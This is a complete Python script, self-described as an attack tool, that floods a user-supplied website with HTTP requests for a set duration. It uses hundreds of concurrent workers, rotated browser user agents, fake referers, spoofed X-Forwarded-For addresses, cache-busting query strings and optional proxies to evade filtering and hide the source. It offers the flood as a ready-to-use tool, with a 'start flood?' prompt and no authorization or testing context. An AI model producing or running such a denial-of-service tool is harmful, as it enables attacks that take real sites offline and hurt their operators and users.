import asyncio
import random
import ssl
import sys
import time
from pathlib import Path

try:
    import aiohttp
except ImportError:
    print("[!] missing dependency — run: pip install aiohttp")
    sys.exit(1)


BANNER = r"""
██╗     ██╗     ██╗     ██╗  ██╗
██║     ██║     ██║     ╚██╗██╔╝
██║     ██║     ██║      ╚███╔╝ 
██║     ██║     ██║      ██╔██╗ 
███████╗███████╗███████╗██╔╝ ██╗
╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                
      LLLX SUPER FAST ATTACK TOOL"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
    "https://www.reddit.com/",
    "https://news.ycombinator.com/",
]

ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"]

DEFAULT_PATHS = [
    "/", "/index.html", "/home", "/login", "/api/health",
    "/search?q=x", "/wp-login.php", "/?p=1", "/assets/app.js",
]



class Stats:
    def __init__(self):
        self.sent = 0
        self.ok = 0
        self.fail = 0
        self.bytes = 0
        self.start = time.monotonic()
        self._last_ok = 0

    def tick(self, ok, n=0):
        self.sent += 1
        if ok:
            self.ok += 1
            self.bytes += n
        else:
            self.fail += 1

    def rps(self):
        cur = self.ok
        d = cur - self._last_ok
        self._last_ok = cur
        return d




def ask(prompt, default=None, cast=str, validate=None):
    while True:
        suffix = f" [{default}]" if default is not None else ""
        raw = input(f"{prompt}{suffix}: ").strip()
        if not raw and default is not None:
            return default
        if not raw:
            print("  ↳ required.")
            continue
        try:
            value = cast(raw)
        except (ValueError, TypeError):
            print("  ↳ invalid value.")
            continue
        if validate and not validate(value):
            print("  ↳ invalid value.")
            continue
        return value


def ask_yes(prompt, default=False):
    d = "Y/n" if default else "y/N"
    raw = input(f"{prompt} [{d}]: ").strip().lower()
    if not raw:
        return default
    return raw in ("y", "yes")


def normalize_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url


def load_proxies(path):
    if not path:
        return []
    f = Path(path)
    if not f.is_file():
        print(f"  ↳ proxy file not found: {path} — continuing without proxies.")
        return []
    out = [ln.strip() for ln in f.read_text().splitlines()
           if ln.strip() and not ln.strip().startswith("#")]
    if not out:
        print(f"  ↳ proxy file empty — continuing without proxies.")
    return out


def rand_path(paths):
    p = random.choice(paths)
    if "?" in p:
        return p + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789",
                                          k=random.randint(3, 12)))
    if random.random() < 0.5:
        return p + "?" + "".join(random.choices("0123456789", k=8))
    return p


async def worker(session, deadline, target, paths, stats, proxies):
    while time.monotonic() < deadline:
        proxy = random.choice(proxies) if proxies else None
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(ACCEPT_LANGS),
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": random.choice(REFERERS),
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
        }
        try:
            url = target.rstrip("/") + rand_path(paths)
            async with session.get(url, headers=headers, proxy=proxy,
                                   allow_redirects=False) as r:
                body = await r.read()
                stats.tick(r.status < 400, len(body))
        except Exception:
            stats.tick(False)


async def reporter(deadline, stats):
    while time.monotonic() < deadline:
        await asyncio.sleep(1)
        rps = stats.rps()
        elapsed = max(time.monotonic() - stats.start, 1)
        mbps = (stats.bytes * 8) / elapsed / 1_000_000
        sys.stdout.write(
            f"\r  rps: {rps:>6}   ok: {stats.ok:>9}   fail: {stats.fail:>8}   "
            f"sent: {stats.sent:>9}   {mbps:>5.2f} Mbps"
        )
        sys.stdout.flush()
    sys.stdout.write("\n")


async def run(target, concurrency, duration, timeout, proxies, insecure):
    deadline = time.monotonic() + duration
    stats = Stats()

    ssl_ctx = ssl.create_default_context()
    if insecure:
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(
        limit=concurrency,
        limit_per_host=concurrency,
        ttl_dns_cache=300,
        ssl=ssl_ctx,
        force_close=False,
        enable_cleanup_closed=True,
    )
    to = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 3))

    print(f"\n  launching {concurrency} workers against {target}...\n")

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=to) as session:
            workers = [
                asyncio.create_task(
                    worker(session, deadline, target, DEFAULT_PATHS, stats, proxies)
                )
                for _ in range(concurrency)
            ]
            rep = asyncio.create_task(reporter(deadline, stats))
            try:
                await asyncio.gather(*workers)
            finally:
                rep.cancel()
                try:
                    await rep
                except asyncio.CancelledError:
                    pass
    except KeyboardInterrupt:
        print("\n  [interrupted]")

    elapsed = time.monotonic() - stats.start
    print(f"\n  done in {elapsed:.1f}s")
    print(f"    sent    : {stats.sent}")
    print(f"    ok      : {stats.ok}")
    print(f"    failed  : {stats.fail}")
    print(f"    avg rps : {stats.ok / max(elapsed, 1):.0f}")
    if stats.bytes:
        print(f"    received: {stats.bytes / 1_000_000:.2f} MB")




def collect_config():
    print(BANNER)
    print("  ── configuration ─────────────────────────────────\n")

    raw_url = input("  site link (e.g. example.com): ").strip()
    if not raw_url:
        print("  [!] no URL given — exiting.")
        sys.exit(1)
    target = normalize_url(raw_url)

    concurrency = ask("  workers / connections", default=500, cast=int,
                      validate=lambda n: n >= 1)
    duration = ask("  duration (seconds)", default=60, cast=int,
                   validate=lambda n: n >= 1)
    timeout = ask("  per-request timeout (s)", default=5.0, cast=float,
                  validate=lambda n: n > 0)

    use_proxies = ask_yes("  use proxy file?", default=False)
    proxies = []
    if use_proxies:
        path = input("  path to proxy file: ").strip()
        proxies = load_proxies(path)

    insecure = ask_yes("  skip TLS verification? (needed for self-signed)",
                       default=False)

    print("\n  ── summary ──────────────────────────────────────")
    print(f"    target      : {target}")
    print(f"    workers     : {concurrency}")
    print(f"    duration    : {duration}s")
    print(f"    timeout     : {timeout}s")
    print(f"    proxies     : {len(proxies) if proxies else 'none'}")
    print(f"    insecure TLS: {insecure}")
    print()

    if not ask_yes("  start flood?", default=True):
        print("  aborted.")
        sys.exit(0)

    return target, concurrency, duration, timeout, proxies, insecure


def main():
    try:
        cfg = collect_config()
        asyncio.run(run(*cfg))
    except KeyboardInterrupt:
        print("\n  [interrupted]")
    except Exception as e:
        print(f"\n  [!] error: {e}")


if __name__ == "__main__":
    main()
